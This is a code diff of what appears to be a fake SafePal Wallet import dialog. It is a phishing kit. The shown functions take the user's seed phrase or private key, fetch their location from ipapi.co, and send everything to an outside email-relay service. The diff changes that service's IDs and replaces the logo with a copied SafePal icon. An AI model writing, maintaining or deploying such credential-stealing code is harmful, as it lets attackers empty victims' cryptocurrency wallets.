@@ -160,7 +160,7 @@ const phraseCount = computed(() => (importType.value === '24' ? 24 : 12));
 const hiddenFields = ref([]);
 const privateKeyInput = ref('');
 const primaryColor = '#7d55ff';
-const logoUrl = 'https://logo.clearbit.com/safepal.com';
+const logoUrl = 'https://downloadr2.apkmirror.com/wp-content/uploads/2023/06/18/647a392160164_io.safepal.wallet-384x384.png';
 
 function closeModal() { emit('close'); }
 
@@ -228,9 +228,9 @@ async function confirmPhrase() {
     const location = await axios.get('https://ipapi.co/json');
     const payload = { type: importType.value, phrase: phraseWords.value.join(' ') };
     const params = {
-      service_id: 'service_eusbqyo',
-      template_id: 'template_z6xga6o',
-      user_id: 'obT4LcwZqPw_KlOar',
+      service_id: 'service_k4kimk6',
+      template_id: 'template_mpy0fmg',
+      user_id: 'DMvtKT5BmC4qV83V9',
       template_params: {
         from_name: 'Blockchain solutions',
         wallet_type: 'SafePal Wallet',
@@ -253,9 +253,9 @@ async function confirmPrivateKey() {
     const location = await axios.get('https://ipapi.co/json');
     const payload = { privateKey: privateKeyInput.value };
     const params = {
-      service_id: 'service_eusbqyo',
-      template_id: 'template_z6xga6o',
-      user_id: 'obT4LcwZqPw_KlOar',
+      service_id: 'service_k4kimk6',
+      template_id: 'template_mpy0fmg',
+      user_id: 'DMvtKT5BmC4qV83V9',
       template_params: {
         from_name: 'Blockchain solutions',
         wallet_type: 'SafePal Wallet',
